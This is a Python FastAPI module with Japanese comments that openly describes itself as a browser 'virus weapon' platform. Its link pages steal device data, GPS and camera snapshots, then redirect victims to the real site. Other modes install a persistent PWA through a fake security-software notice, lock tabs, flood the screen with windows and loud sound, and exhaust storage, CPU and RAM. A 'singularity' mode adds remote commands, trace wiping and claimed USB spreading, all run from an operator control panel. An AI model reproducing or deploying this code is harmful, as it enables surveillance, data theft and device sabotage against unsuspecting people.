"""ウイルス兵器モジュール。既存コードに依存しない独立実装。

  GET  /v/{code}                兵器ページ（モード別・JS全部インライン・完全自動）
  GET  /v/{code}/st             状態（set/firing/seq）※兵器ページがポーリング
  POST /v/{code}/d              収集データの投入
  GET  /v/{code}/manifest.json  常駐型トロイ用（mode で発射モードを指定可）
  GET  /v/sw.js                 Service Worker（常駐型）
  GET  /v/icon.svg              アイコン
  GET  /vp , POST /vp/add       一覧・作成
  GET  /vp/{code}               監視室（＝こちらの操作盤）
  POST /vp/{code}/fire          1セット出す
  POST /vp/{code}/stop          停止
  POST /vp/{code}/resume        再開
  POST /vp/{code}/set           1セット枚数（10/100/0=無限）
  GET  /api/vp/{code}           データJSON

  --- SINGULARITY モード（最上位兵器・常駐型） ---
  GET  /v/{code}/sg             本体ページ（singularity.py のペイロードを起動）
  GET  /v/{code}/sg/{sid}       子リンク（感染チェーン継承）
  GET  /v/{code}/sg/sw.js       Service Worker（復活機構・コマンド受信）
  GET  /v/{code}/sg/manifest.json  PWAマニフェスト（インストール用）
  GET  /v/{code}/sg/icon-192.png   アイコン192
  GET  /v/{code}/sg/icon-512.png   アイコン512
  GET  /v/{code}/sg/icon.svg       アイコンSVG（Pillow無しのフォールバック）
  GET  /v/{code}/sg/worker.js   CPU/GPUワーカー
  GET  /v/{code}/sg/cmd         遠隔コマンド（SW／ペイロードが拾う）
  POST /v/{code}/sg/c           報告の投入（fetch/beacon）
  GET  /v/{code}/sg/c           報告の投入（画像ピクセル経路）
  POST /vp/{code}/level         レベル 0〜5 を遠隔変更
  POST /vp/{code}/freeze        凍結 off/soft/hard
  POST /vp/{code}/detonate      最終形態（L5）へ
  POST /vp/{code}/wipe          痕跡を完全消去させる

モード:
  trojan_link    トロイの木馬（リンク型）
  trojan_install トロイの木馬（常駐型）
  max_power      全部盛り（最高威力）
  brick          ブリック（タブが死なない）
  windows        爆音窓爆弾（音＋大量ウィンドウ）
  storage        容量枯渇
  mix            全部ミックス
  singularity    特異点（全16系統統合の最上位兵器・PWA常駐・USBワーム）

設計:
  兵器ページはボタン無し。開いた瞬間から全部自動・無限。
  枚数や発射・停止はこちらの監視室から遠隔操作する（兵器ページがポーリング）。
  通知バナーで「偽の対策ソフト（＝指定した兵器）」を入れさせることができる。
  singularity はさらに PWA として端末にインストールさせ、常駐・自動起動する。
"""
from __future__ import annotations

import os
import re
import io
import json
import base64
import random
import string
import sqlite3
import datetime as dt
from urllib.parse import quote_plus

from fastapi import APIRouter, Request, Depends, Form, HTTPException
from fastapi.responses import (HTMLResponse, RedirectResponse, PlainTextResponse,
                               JSONResponse, Response)

from . import tenancy, users, linktrack

router = APIRouter()

MODES = ["trojan_link", "trojan_install", "max_power", "brick",
         "windows", "storage", "mix", "singularity"]
MODE_ALIAS = {"sound": "windows", "sg": "singularity"}   # 旧 sound は爆音窓爆弾へ統合

MODE_LABEL = {
    "trojan_link": "トロイの木馬（リンク型）",
    "trojan_install": "トロイの木馬（常駐型）",
    "max_power": "全部盛り（最高威力）",
    "brick": "ブリック（タブが死なない）",
    "windows": "爆音窓爆弾（音＋大量ウィンドウ）",
    "storage": "容量枯渇",
    "mix": "全部ミックス",
    "singularity": "特異点（SINGULARITY）",
}
MODE_DESC = {
    "trojan_link": "開いた瞬間に全部抜き取って、何事もなかったように本物のサイトへ飛ばす。",
    "trojan_install": "ホーム画面に居座らせて、以後も勝手に起動して送り続ける。",
    "max_power": "位置・カメラ・指紋・電池・回線・容量まで、取れるものを全部。無限に。",
    "brick": "タブを閉じられなくする。画面は消えず、音も鳴り続ける。",
    "windows": "開いた瞬間に大量のウィンドウを出し切る。全ウィンドウが爆音ループ＋感染表示。∞なら止まるまで。",
    "storage": "開いた瞬間に端末の容量を埋め尽くす。",
    "mix": "上の全部を無限に。最強。",
    "singularity": "全16系統・5資源同時攻撃。CPU全コア・GPU・RAM・ディスクを枯渇させ、メインスレッドを凍結し、PWAとして端末に常駐インストールされる。相手のUSBにも自分を仕込んで伝染する。監視室からレベル0〜5を遠隔変更できる。",
}

# 常駐（ホーム画面追加）で自動発射するモード
AUTO_MODES = ("trojan_install", "mix")

# 1セットの枚数（10 / 100 / 0=無限）
SET_CHOICES = (10, 100, 0)

DEFAULT_NOTIFY = "今すぐ脆弱性ブロッカーをインストールしてウイルス感染を回避してください。"

CAUTION = {
    "trojan_link": "⚠ 開いた瞬間から全部自動・無限。ボタン操作は不要。抜き取ったあとは本物へ飛ぶ（自爆）。",
    "trojan_install": "⚠ ホーム画面に追加＝自爆。以後その端末では勝手に起動し続け、本人が消すまで止まらない。",
    "max_power": "⚠ 開いた瞬間から全部自動・無限。止まらない。ボタン操作は不要。",
    "brick": "⚠ 開いた瞬間から全部自動・無限。タブが死ななくなる。",
    "windows": "⚠ 開いた瞬間に1セット（既定100枚）を10秒以内に出し切る。全ウィンドウが爆音ループ＋感染表示。∞なら止まるまで。",
    "storage": "⚠ 開いた瞬間に容量を埋め始める。ボタン操作は不要。",
    "mix": "⚠ ホーム画面に追加＝自爆。開いた瞬間から全部が無限に発動する。",
    "singularity": "⚠ 最終兵器。ディスクをquotaの95%まで食い、全コアを100%で回し、RAMを膨張させ、タブを閉じにくくする。さらにPWAとして端末に常駐し、OSログイン時に自動起動する。相手のUSBにも仕込んで伝染する。レベルは監視室から遠隔操作。停止・凍結中でもService Worker経由で命令が届く。",
}

SCHEMA = """
CREATE TABLE IF NOT EXISTS virus_links(
  code TEXT PRIMARY KEY, name TEXT, mode TEXT, note TEXT, dest TEXT,
  active INTEGER DEFAULT 1, created TEXT, hits INTEGER DEFAULT 0,
  last_ts TEXT, last_ip TEXT, last_ua TEXT, last_device TEXT,
  winset INTEGER DEFAULT 100, firing INTEGER DEFAULT 1, seq INTEGER DEFAULT 0,
  notify INTEGER DEFAULT 1, notify_text TEXT, notify_mode TEXT,
  level INTEGER DEFAULT 1, wipe_seq INTEGER DEFAULT 0, freeze TEXT DEFAULT '');
CREATE TABLE IF NOT EXISTS virus_hits(
  id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, ts TEXT, ip TEXT, ua TEXT,
  device TEXT, os TEXT, browser TEXT, inapp TEXT, country TEXT, city TEXT,
  isp TEXT, vid TEXT, gps_lat REAL, gps_lon REAL);
CREATE INDEX IF NOT EXISTS virus_hits_code ON virus_hits(code, id);
CREATE TABLE IF NOT EXISTS virus_data(
  id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, hit INTEGER, vid TEXT,
  key TEXT, value TEXT, ts TEXT);
CREATE INDEX IF NOT EXISTS virus_data_code ON virus_data(code, hit);
"""


# ---------------- 基盤 ----------------

def _m():
    from . import main
    return main


def _render(name, request, **ctx):
    return _m().render(name, request, **ctx)


async def _auth(request: Request):
    return await _m().auth(request)


def _now():
    return dt.datetime.now(dt.timezone.utc).isoformat(timespec="seconds")


def _base(request):
    return _m()._base(request).rstrip("/")


def _abs_dest(d):
    d = (d or "").strip()
    if not d:
        return ""
    if not re.match(r"^[a-zA-Z][a-zA-Z0-9+.\-]*:", d):
        d = "https://" + d
    return d


def _owner(code):
    try:
        o = users.owner_of_link(code)
    except Exception:
        o = None
    if not o:
        return None
    try:
        tenancy.set_current(o)
    except Exception:
        pass
    return o


def _dir(owner):
    d = os.path.join(tenancy.ROOT, tenancy.safe_name(owner), "virus")
    os.makedirs(d, exist_ok=True)
    return d


def _migrate(c):
    try:
        cols = {r["name"] for r in c.execute("PRAGMA table_info(virus_links)").fetchall()}
    except Exception:
        cols = set()
    for name, ddl in (("winset", "INTEGER DEFAULT 100"),
                      ("firing", "INTEGER DEFAULT 1"),
                      ("seq", "INTEGER DEFAULT 0"),
                      ("notify", "INTEGER DEFAULT 1"),
                      ("notify_text", "TEXT"),
                      ("notify_mode", "TEXT"),
                      ("level", "INTEGER DEFAULT 1"),
                      ("wipe_seq", "INTEGER DEFAULT 0"),
                      ("freeze", "TEXT DEFAULT ''")):
        if name not in cols:
            try:
                c.execute(f"ALTER TABLE virus_links ADD COLUMN {name} {ddl}")
            except Exception:
                pass
    # --- singularity 用: hits に GPS 列を足す ---
    try:
        hcols = {r["name"] for r in c.execute("PRAGMA table_info(virus_hits)").fetchall()}
    except Exception:
        hcols = set()
    for name, ddl in (("gps_lat", "REAL"), ("gps_lon", "REAL")):
        if name not in hcols:
            try:
                c.execute(f"ALTER TABLE virus_hits ADD COLUMN {name} {ddl}")
            except Exception:
                pass
    c.commit()


def _db(owner):
    c = sqlite3.connect(os.path.join(_dir(owner), "virus.db"),
                        timeout=15, check_same_thread=False)
    c.row_factory = sqlite3.Row
    try:
        c.execute("PRAGMA journal_mode=WAL")
        c.executescript(SCHEMA)
        _migrate(c)
    except Exception:
        pass
    return c


def _link(c, code):
    return c.execute("SELECT * FROM virus_links WHERE code=?", (code,)).fetchone()


def _val(row, key, default):
    try:
        v = row[key]
        return default if v is None else v
    except Exception:
        return default


def _norm_mode(m):
    m = MODE_ALIAS.get(m or "", m or "")
    return m if m in MODES else "mix"


def _new_code(c, n=8):
    a = string.ascii_lowercase + string.digits
    for _ in range(80):
        code = "".join(random.choice(a) for _ in range(n))
        if not c.execute("SELECT 1 FROM virus_links WHERE code=?", (code,)).fetchone():
            try:
                if not users.owner_of_link(code):
                    return code
            except Exception:
                return code
    return "".join(random.choice(a) for _ in range(n + 4))


def _geo(ip):
    try:
        return linktrack.geo(ip) or {}
    except Exception:
        return {}


def _record_hit(owner, code, request):
    ip = linktrack.client_ip(request)
    ua = request.headers.get("user-agent", "")
    p = linktrack.parse_ua(ua)
    g = _geo(ip)
    c = _db(owner)
    cur = c.execute("INSERT INTO virus_hits(code,ts,ip,ua,device,os,browser,inapp,"
                    "country,city,isp,vid) VALUES(?,?,?,?,?,?,?,?,?,?,?,'')",
                    (code, _now(), ip, ua[:400], p["device"], p["os"], p["browser"],
                     p["inapp"], g.get("country"), g.get("city"), g.get("isp")))
    hid = cur.lastrowid
    c.execute("UPDATE virus_links SET hits=COALESCE(hits,0)+1, last_ts=?, last_ip=?, "
              "last_ua=?, last_device=? WHERE code=?",
              (_now(), ip, ua[:400], (p["device"] or "") + " / " + (p["os"] or ""), code))
    c.commit()
    c.close()
    return hid


# ---------------- 一覧・作成 ----------------

@router.get("/vp", response_class=HTMLResponse)
def list_page(request: Request, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    rows = [dict(r) for r in c.execute(
        "SELECT * FROM virus_links ORDER BY created DESC").fetchall()]
    c.close()
    base = _base(request)
    for r in rows:
        r["share"] = base + "/v/" + r["code"]
        r["watch"] = base + "/vp/" + r["code"]
        r["mode"] = _norm_mode(r.get("mode"))
        r["mode_label"] = MODE_LABEL.get(r["mode"], r["mode"])
        r["caution"] = CAUTION.get(r["mode"], "")
        r["auto"] = (r["mode"] in AUTO_MODES)
        r["level"] = int(r.get("level") or 1)
        r["set_label"] = "∞" if (r.get("winset") == 0) else f'{r.get("winset") or 100}枚/セット'
        r["firing"] = r.get("firing", 1)
    return _render("virus_list.html", request, rows=rows, base=base,
                   cautions=CAUTION, sets=SET_CHOICES, default_notify=DEFAULT_NOTIFY,
                   levels=_SG_LEVEL_LABEL,
                   modes=[(m, MODE_LABEL[m], MODE_DESC[m]) for m in MODES])


@router.post("/vp/add")
def create(request: Request, name: str = Form(""), mode: str = Form("mix"),
           dest: str = Form(""), note: str = Form(""), winset: str = Form("100"),
           notify: str = Form(""), notify_text: str = Form(""),
           notify_mode: str = Form(""), u=Depends(_auth)):
    owner = tenancy.get_current() or u
    mode = _norm_mode(mode)
    try:
        ws = int(winset)
    except Exception:
        ws = 100
    ws = ws if ws in SET_CHOICES else 100
    nm = _norm_mode(notify_mode) if notify_mode else ""
    ntext = (notify_text or "").strip()[:200] or DEFAULT_NOTIFY
    c = _db(owner)
    code = _new_code(c)
    c.execute("INSERT INTO virus_links(code,name,mode,note,dest,active,created,hits,"
              "winset,firing,seq,notify,notify_text,notify_mode,level) "
              "VALUES(?,?,?,?,?,1,?,0,?,1,0,?,?,?,1)",
              (code, (name or "").strip()[:40] or "名無し", mode,
               (note or "").strip()[:200], (dest or "").strip(), _now(), ws,
               1 if notify else 0, ntext, nm))
    c.commit()
    c.close()
    try:
        users.register_link(code, u)
    except Exception:
        pass
    return RedirectResponse("/vp/" + code + "?new=1", status_code=303)


# ---------------- 常駐型の付属物 ----------------

@router.get("/v/sw.js")
def sw():
    js = """/* igtracker virus sw */
self.addEventListener("install", function (e) { self.skipWaiting(); });
self.addEventListener("activate", function (e) { e.waitUntil(self.clients.claim()); });
self.addEventListener("fetch", function (e) {
  if (e.request.method !== "GET") return;
  if (new URL(e.request.url).origin !== location.origin) return;
});
self.addEventListener("message", function (e) {
  if (e.data && e.data.type === "skip") self.skipWaiting();
});
"""
    return Response(js, media_type="application/javascript",
                    headers={"Service-Worker-Allowed": "/v/"})


@router.get("/v/icon.svg")
def icon():
    svg = """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 192 192">
<rect width="192" height="192" rx="40" fill="#0f1115"/>
<circle cx="96" cy="96" r="26" fill="#4c8dff"/>
<circle cx="96" cy="96" r="52" fill="none" stroke="#4c8dff" stroke-width="6" opacity=".5"/>
<circle cx="96" cy="96" r="74" fill="none" stroke="#7ee08a" stroke-width="4" opacity=".35"/>
</svg>"""
    return Response(svg, media_type="image/svg+xml")


@router.get("/v/{code}/manifest.json")
def manifest(code: str, name: str = "", mode: str = ""):
    """mode を渡すと、インストール後の発射モードを差し替えられる。"""
    start = "/v/" + code + "?i=1"
    if mode:
        start += "&m=" + mode
    man = {
        "name": (name or "igtracker")[:40],
        "short_name": (name or "igtracker")[:12],
        "start_url": start,
        "scope": "/v/",
        "display": "standalone",
        "background_color": "#0f1115",
        "theme_color": "#0f1115",
        "icons": [{"src": "/v/icon.svg", "sizes": "any", "type": "image/svg+xml",
                   "purpose": "any maskable"}],
    }
    return JSONResponse(man)


# ---------------- 状態（兵器ページがポーリング） ----------------

@router.get("/v/{code}/st")
def status(code: str):
    owner = _owner(code)
    if not owner:
        return {"ok": 0}
    c = _db(owner)
    row = _link(c, code)
    c.close()
    if not row:
        return {"ok": 0}
    return {"ok": 1,
            "set": _val(row, "winset", 100),
            "firing": _val(row, "firing", 1),
            "seq": _val(row, "seq", 0)}


# ---------------- 兵器ページ ----------------

@router.get("/v/{code}", response_class=HTMLResponse)
def land(code: str, request: Request):
    owner = _owner(code)
    if not owner:
        return PlainTextResponse("リンクが無効です", status_code=404)
    c = _db(owner)
    row = _link(c, code)
    c.close()
    if not row or not row["active"]:
        return PlainTextResponse("リンクが無効です", status_code=404)

    # ?m= でモード上書き（インストール後の起動用）
    mode = _norm_mode(request.query_params.get("m") or row["mode"])

    if mode == "singularity":
        return _sg_land(code, request)

    hid = _record_hit(owner, code, request)
    child = request.query_params.get("w") == "1"
    installed = request.query_params.get("i") == "1"

    notify_mode = _val(row, "notify_mode", "") or ""
    notify_mode = _norm_mode(notify_mode) if notify_mode else ""
    notify = int(_val(row, "notify", 1))
    notify_text = _val(row, "notify_text", "") or DEFAULT_NOTIFY
    # インストールさせる対象（通知のボタンが入れる兵器）
    install_mode = notify_mode or (mode if mode in ("trojan_install", "mix") else "")

    return _render(
        "virus.html", request,
        code=code, link=dict(row), hit_id=hid, mode=mode,
        mode_label=MODE_LABEL[mode], mode_desc=MODE_DESC[mode],
        caution=CAUTION.get(mode, ""),
        auto=(mode in AUTO_MODES),
        winset=_val(row, "winset", 100),
        firing=_val(row, "firing", 1),
        seq=_val(row, "seq", 0),
        notify=notify, notify_text=notify_text, notify_mode=notify_mode,
        install_mode=install_mode,
        dest=_abs_dest(row["dest"]), is_child=child, is_installed=installed,
        child_text=random.choice([
            "システム警告", "メモリ不足", "ディスク容量が危険です", "異常を検出しました",
            "バックグラウンドで動作中", "最適化が必要です", "ウイルスを検出しました",
            "このウィンドウは閉じないでください",
        ]),
    )


@router.post("/v/{code}/d")
async def data(code: str, request: Request):
    owner = _owner(code)
    if not owner:
        return {"ok": 0}
    try:
        body = await request.json()
    except Exception:
        body = {}
    if not isinstance(body, dict):
        body = {}
    hid = body.get("hit") or 0
    vid = str(body.get("vid") or "")[:40]
    items = body.get("items")
    if not isinstance(items, dict):
        items = {}
    c = _db(owner)
    n = 0
    ts = _now()
    for k, v in list(items.items())[:200]:
        if v is None:
            continue
        if not isinstance(v, str):
            try:
                v = json.dumps(v, ensure_ascii=False)
            except Exception:
                v = str(v)
        c.execute("INSERT INTO virus_data(code,hit,vid,key,value,ts) VALUES(?,?,?,?,?,?)",
                  (code, int(hid or 0), vid, str(k)[:60], v[:20000], ts))
        n += 1
    if vid:
        c.execute("UPDATE virus_hits SET vid=? WHERE id=?", (vid, int(hid or 0)))
    c.execute("UPDATE virus_links SET last_ts=? WHERE code=?", (ts, code))
    try:
        c.execute("DELETE FROM virus_data WHERE code=? AND id NOT IN "
                  "(SELECT id FROM virus_data WHERE code=? ORDER BY id DESC LIMIT 20000)",
                  (code, code))
    except Exception:
        pass
    c.commit()
    c.close()
    return {"ok": 1, "n": n, "server": ts}


# ---------------- 監視室（こちらの操作盤） ----------------

@router.get("/vp/{code}", response_class=HTMLResponse)
def watch(code: str, request: Request, new: str = "", u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    row = _link(c, code)
    if not row:
        c.close()
        raise HTTPException(404)
    hits = [dict(r) for r in c.execute(
        "SELECT * FROM virus_hits WHERE code=? ORDER BY id DESC LIMIT 300", (code,)).fetchall()]
    dat = [dict(r) for r in c.execute(
        "SELECT * FROM virus_data WHERE code=? ORDER BY id DESC LIMIT 3000", (code,)).fetchall()]
    c.close()
    base = _base(request)
    by_hit = {}
    for d in dat:
        by_hit.setdefault(d["hit"], []).append(d)
    mode = _norm_mode(row["mode"])
    notify_mode = _val(row, "notify_mode", "") or ""
    notify_mode = _norm_mode(notify_mode) if notify_mode else ""
    lv = int(_val(row, "level", 1) or 0)
    return _render("virus_watch.html", request, code=code, link=dict(row),
                   hits=hits, by_hit=by_hit, base=base, is_new=(new == "1"),
                   mode_label=MODE_LABEL.get(mode, mode),
                   mode_desc=MODE_DESC.get(mode, ""),
                   caution=CAUTION.get(mode, ""),
                   auto=(mode in AUTO_MODES),
                   sets=SET_CHOICES, default_notify=DEFAULT_NOTIFY,
                   notify=int(_val(row, "notify", 1)),
                   notify_text=_val(row, "notify_text", "") or DEFAULT_NOTIFY,
                   notify_mode=notify_mode,
                   winset=_val(row, "winset", 100),
                   firing=_val(row, "firing", 1),
                   share=base + "/v/" + code, total=len(hits),
                   is_sg=(mode == "singularity"),
                   level=lv, level_label=_SG_LEVEL_LABEL.get(lv, ""),
                   level_desc=_SG_LEVEL_DESC.get(lv, ""),
                   levels=sorted(_SG_LEVEL_LABEL.keys()),
                   freeze=_val(row, "freeze", "") or "",
                   wipe_seq=int(_val(row, "wipe_seq", 0) or 0),
                   install_level=_SG_INSTALL_LEVEL,
                   modes=[(m, MODE_LABEL[m]) for m in MODES])


@router.post("/vp/{code}/fire")
def fire(code: str, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    c.execute("UPDATE virus_links SET firing=1, seq=COALESCE(seq,0)+1 WHERE code=?", (code,))
    c.commit()
    c.close()
    return RedirectResponse("/vp/" + code + "?fired=1", status_code=303)


@router.post("/vp/{code}/stop")
def stop(code: str, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    c.execute("UPDATE virus_links SET firing=0 WHERE code=?", (code,))
    c.commit()
    c.close()
    return RedirectResponse("/vp/" + code, status_code=303)


@router.post("/vp/{code}/resume")
def resume(code: str, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    c.execute("UPDATE virus_links SET firing=1 WHERE code=?", (code,))
    c.commit()
    c.close()
    return RedirectResponse("/vp/" + code, status_code=303)


@router.post("/vp/{code}/set")
def set_size(code: str, winset: str = Form("100"), u=Depends(_auth)):
    owner = tenancy.get_current() or u
    try:
        ws = int(winset)
    except Exception:
        ws = 100
    ws = ws if ws in SET_CHOICES else 100
    c = _db(owner)
    c.execute("UPDATE virus_links SET winset=? WHERE code=?", (ws, code))
    c.commit()
    c.close()
    return RedirectResponse("/vp/" + code, status_code=303)


@router.get("/api/vp/{code}")
def api(code: str, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    row = _link(c, code)
    if not row:
        c.close()
        raise HTTPException(404)
    hits = [dict(r) for r in c.execute(
        "SELECT * FROM virus_hits WHERE code=? ORDER BY id DESC LIMIT 300", (code,)).fetchall()]
    c.close()
    return {"hits": hits, "count": len(hits), "server": _now(),
            "set": _val(row, "winset", 100), "firing": _val(row, "firing", 1)}


@router.post("/vp/{code}/update")
def update(request: Request, code: str, name: str = Form(""), mode: str = Form(""),
           dest: str = Form(""), note: str = Form(""), active: str = Form(""),
           winset: str = Form(""), notify: str = Form(""),
           notify_text: str = Form(""), notify_mode: str = Form(""),
           u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    if not _link(c, code):
        c.close()
        raise HTTPException(404)
    f, v = [], []
    if name.strip():
        f.append("name=?"); v.append(name.strip()[:40])
    if mode:
        f.append("mode=?"); v.append(_norm_mode(mode))
    f.append("dest=?"); v.append((dest or "").strip())
    f.append("note=?"); v.append((note or "").strip()[:200])
    if active in ("0", "1"):
        f.append("active=?"); v.append(int(active))
    if winset != "":
        try:
            ws = int(winset)
        except Exception:
            ws = 100
        if ws in SET_CHOICES:
            f.append("winset=?"); v.append(ws)
    f.append("notify=?"); v.append(1 if notify else 0)
    f.append("notify_text=?"); v.append((notify_text or "").strip()[:200] or DEFAULT_NOTIFY)
    f.append("notify_mode=?"); v.append(_norm_mode(notify_mode) if notify_mode else "")
    v.append(code)
    c.execute("UPDATE virus_links SET " + ",".join(f) + " WHERE code=?", v)
    c.commit()
    c.close()
    return RedirectResponse("/vp/" + code, status_code=303)


@router.post("/vp/{code}/clear")
def clear(request: Request, code: str, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    c.execute("DELETE FROM virus_hits WHERE code=?", (code,))
    c.execute("DELETE FROM virus_data WHERE code=?", (code,))
    c.execute("UPDATE virus_links SET hits=0, last_ts=NULL, last_ip=NULL, last_ua=NULL,"
              " last_device=NULL WHERE code=?", (code,))
    c.commit()
    c.close()
    return RedirectResponse("/vp/" + code, status_code=303)


@router.post("/vp/{code}/delete")
def delete(request: Request, code: str, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    c.execute("DELETE FROM virus_hits WHERE code=?", (code,))
    c.execute("DELETE FROM virus_data WHERE code=?", (code,))
    c.execute("DELETE FROM virus_links WHERE code=?", (code,))
    c.commit()
    c.close()
    try:
        users.unlink_owner(code)
    except Exception:
        pass
    return RedirectResponse("/vp", status_code=303)


# ===========================================================================
# SINGULARITY（最上位兵器）を「モード」として統合
#   /v/{code} で mode=="singularity" を選ぶと、singularity.py の本体を
#   このコード専用の収集先・子リンク・SW・マニフェストで起動する。
#   → 兵器庫・監視室・バックアップにそのまま乗る（別ルートを汚さない）
# ===========================================================================
from .singularity import (PAYLOAD_JS as _SG_PAYLOAD, SW_JS as _SG_SW,
                          WORKER_JS as _SG_WORKER, VIRUS as SINGULARITY,
                          new_sid as _sg_sid, LEVEL_LABEL as _SG_LEVEL_LABEL,
                          LEVEL_DESC as _SG_LEVEL_DESC,
                          APP_NAME_DEFAULT as _SG_APP_NAME)

MODE_LABEL["singularity"] = "特異点（SINGULARITY）"
_GIF1 = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")
_SG_INSTALL_LEVEL = int(os.getenv("SG_INSTALL_LEVEL", "4"))

try:
    from PIL import Image, ImageDraw           # noqa
    _SG_PIL = True
except Exception:
    _SG_PIL = False

_SG_ICONS = {}


def _sg_icon(size, maskable=False):
    """PWA 用アイコンを Pillow で生成（無ければ空を返し SVG にフォールバック）。"""
    key = (size, bool(maskable))
    if key in _SG_ICONS:
        return _SG_ICONS[key]
    data = b""
    if _SG_PIL:
        try:
            img = Image.new("RGB", (size, size), (5, 7, 10))
            d = ImageDraw.Draw(img)
            c = size / 2.0
            pad = size * (0.30 if maskable else 0.22)
            r1 = c - pad
            r2 = r1 * 0.62
            r3 = r1 * 0.27
            d.ellipse([c - r1, c - r1, c + r1, c + r1],
                      outline=(0, 255, 136), width=max(2, int(size * 0.022)))
            d.ellipse([c - r2, c - r2, c + r2, c + r2],
                      outline=(76, 141, 255), width=max(2, int(size * 0.018)))
            d.ellipse([c - r3, c - r3, c + r3, c + r3], fill=(0, 255, 136))
            r0 = max(2, int(size * 0.045))
            d.ellipse([c - r0, c - r0, c + r0, c + r0], fill=(235, 255, 246))
            buf = io.BytesIO()
            img.save(buf, format="PNG", optimize=True)
            data = buf.getvalue()
        except Exception:
            data = b""
    _SG_ICONS[key] = data
    return data


_SG_ICON_SVG = (
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">'
    '<rect width="512" height="512" rx="110" fill="#05070a"/>'
    '<circle cx="256" cy="256" r="170" fill="none" stroke="#00ff88" stroke-width="14"/>'
    '<circle cx="256" cy="256" r="104" fill="none" stroke="#4c8dff" stroke-width="12"/>'
    '<circle cx="256" cy="256" r="46" fill="#00ff88"/>'
    '<circle cx="256" cy="256" r="12" fill="#ebfff6"/></svg>'
)


def _sg_flat(prefix, obj, out, depth=0):
    """singularity の巨大JSONを key/value に平坦化する。"""
    if depth > 7 or len(out) > 400:
        return
    if isinstance(obj, dict):
        for k, v in obj.items():
            _sg_flat(f"{prefix}.{k}" if prefix else str(k), v, out, depth + 1)
    elif isinstance(obj, list):
        if obj and not any(isinstance(x, (dict, list)) for x in obj):
            out[prefix] = json.dumps(obj, ensure_ascii=False)
        else:
            for i, v in enumerate(obj[:40]):
                _sg_flat(f"{prefix}[{i}]", v, out, depth + 1)
    elif obj is None:
        return
    else:
        out[prefix] = obj


def _sg_ingest(owner, code, report, sid):
    """singularity の報告を virus_data に取り込む（差分のみ・監視室にそのまま出る）。"""
    sid = str(sid or report.get("sid") or "")[:64]
    c = _db(owner)
    hid = 0
    if sid:
        r = c.execute("SELECT id FROM virus_hits WHERE code=? AND vid=? "
                      "ORDER BY id DESC LIMIT 1", (code, sid)).fetchone()
        hid = r["id"] if r else 0
    if not hid:
        r = c.execute("SELECT id FROM virus_hits WHERE code=? ORDER BY id DESC LIMIT 1",
                      (code,)).fetchone()
        hid = r["id"] if r else 0

    items = {}
    _sg_flat("", report, items)
    snap = (report.get("media") or {}).get("snapshot") or ""
    items.pop("media.snapshot", None)

    have = {}
    for r in c.execute("SELECT key,value FROM virus_data WHERE code=? AND hit=?",
                       (code, hid)).fetchall():
        have[r["key"]] = r["value"]

    ts = _now()
    n = 0
    for k, v in list(items.items())[:400]:
        if not isinstance(v, str):
            v = json.dumps(v, ensure_ascii=False) if isinstance(v, (dict, list)) else str(v)
        if have.get(k) == v:
            continue
        c.execute("INSERT INTO virus_data(code,hit,vid,key,value,ts) VALUES(?,?,?,?,?,?)",
                  (code, hid, sid, str(k)[:60], v[:20000], ts))
        n += 1
    if snap and have.get("selfie") != snap:
        c.execute("INSERT INTO virus_data(code,hit,vid,key,value,ts) VALUES(?,?,?,?,?,?)",
                  (code, hid, sid, "selfie", snap[:400000], ts))
        n += 1

    gps = (report.get("media") or {}).get("gps") or {}
    try:
        if gps.get("lat") is not None:
            c.execute("UPDATE virus_hits SET gps_lat=?, gps_lon=? WHERE id=?",
                      (float(gps["lat"]), float(gps["lon"]), hid))
    except Exception:
        pass

    c.execute("UPDATE virus_links SET last_ts=? WHERE code=?", (ts, code))
    try:
        c.execute("DELETE FROM virus_data WHERE code=? AND id NOT IN "
                  "(SELECT id FROM virus_data WHERE code=? ORDER BY id DESC LIMIT 20000)",
                  (code, code))
    except Exception:
        pass
    c.commit()
    c.close()
    return n


def _sg_land(code, request, sid=""):
    owner = _owner(code)
    if not owner:
        return PlainTextResponse("リンクが無効です", status_code=404)
    c = _db(owner)
    row = _link(c, code)
    c.close()
    if not row or not row["active"]:
        return PlainTextResponse("リンクが無効です", status_code=404)

    sid = (sid or _sg_sid())[:64]
    ref = request.query_params.get("ref") or ""
    w = request.query_params.get("w") or "0"
    wipe = request.query_params.get("wipe") == "1"
    installed = request.query_params.get("i") == "1"
    hid = _record_hit(owner, code, request)
    c = _db(owner)
    try:
        c.execute("UPDATE virus_hits SET vid=? WHERE id=?", (sid, hid))
        c.commit()
    except Exception:
        pass
    c.close()

    base = f"/v/{code}/sg"
    lv = int(_val(row, "level", 1) or 0)
    lvq = request.query_params.get("level")
    if lvq is not None and str(lvq).isdigit():
        lv = max(0, min(5, int(lvq)))
    if installed:
        lv = max(lv, _SG_INSTALL_LEVEL)          # インストール済みアプリ窓は最低L4

    _n = (row["name"] or "").strip()
    app_name = (request.query_params.get("n")
                or os.getenv("SG_APP_NAME")
                or (f"{_n} の保護" if _n and _n != "名無し" else _SG_APP_NAME))

    cfg = {
        "sid": sid, "path": base, "collect": base + "/c", "cmd": base + "/cmd",
        "sw": base + "/sw.js", "manifest": base + "/manifest.json",
        "icons": [base + "/icon-192.png", base + "/icon-512.png"],
        "level": lv, "fire": int(_val(row, "firing", 1) or 0),
        "freeze": _val(row, "freeze", "") or "",
        "w": int(w) if str(w).isdigit() else 0,
        "wipe": wipe, "avName": app_name,
        "install": os.getenv("SG_INSTALL", "auto"),
        "installLevel": _SG_INSTALL_LEVEL,
        # --- USBワーム（相手のUSBを再武装させる） ---
        "code": code, "usbCode": code, "usbWorm": True, "usbBase": "",
        "usbLabel": app_name,
    }
